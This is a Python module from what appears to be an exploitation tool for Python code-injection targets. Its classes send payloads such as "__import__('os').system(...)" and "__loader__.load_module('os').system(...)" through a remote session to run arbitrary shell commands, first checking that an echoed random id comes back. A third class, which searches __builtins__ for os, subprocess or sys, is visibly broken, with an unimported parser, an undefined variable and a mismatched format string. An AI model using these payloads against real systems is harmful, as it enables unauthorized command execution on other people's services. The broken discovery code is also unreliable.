#!/usr/bin/env python3

from . import logger, utils


class Vector:
    name = 'Undefined'

    def __init__(self, session):
        self.session = session


    def test(self):
        logger.warn('Vector %s does not have a test defined' % self.name)
        return False

    def execute(self, cmd):
        logger.warn('Vector %s does not have an execute function defined' % self.name)
        return False


class LoaderVector(Vector):
    name = '__loader__'

    def test(self):
        return self.session.random_id in self.session.send("__loader__.load_module('os').system('echo \"%s\"')" % self.session.random_id)

    def execute(self, cmd):
        return self.session.send("__loader__.load_module('os').system('%s')" % utils.sanitize_python_apostrophe(cmd))


class ImportVector(Vector):
    name = '__import__'

    def test(self):
        return self.session.random_id in self.session.send("__import__('os').system('echo \"%s\"')" % self.session.random_id)

    def execute(self, cmd):
        return self.session.send("__import__('os').system('%s')" % utils.sanitize_python_apostrophe(cmd))


class DiscoveryVector(Vector):
    name = '__builtins__ Discovery'
    paths = ['__builtins__']
    goals = ['os', 'subprocess', 'sys']
    

    def _explore(self, path):
        output = self.session.send(path).strip()

        if output.startswith('<module'):
            output = self.session.send('dir(%s)' % path).strip()

        # at this point we have the dir() list in `output` now
        output = parser.parse_list(output)

        # now we have a list object in memory from dir()
        for module in self.goals:
            if module in output:
                logger.debug('Discovered potential goal at path %s, checking if module' % path)
                


    def test(self):
        self._map = dict()

        for path in paths:
            module, output = self._explore(path)

            if output:
                logger.info('Found a path (base=%s, payload=%s, module=%s)' % (repr(path), repr(output), repr(module)))

                self.found_basepath = path # the successful path
                self.found_payload = output # the base payload to the given module
                self.found_module = module # the str of the module we found

                return True

        return False


    def execute(self, cmd):
        # subprocess.os
        if self.found_module == 'subprocess':
            self.found_payload += '.os'

        # sys.modules['os']
        if self.found_module == 'sys':
            self.found_payload += ".modules['os']"

        # now that we have the `os` module
        return self.session.send("%s.system('%s')" % (self.found_payload))

vectors = [
    ImportVector,
    LoaderVector
]

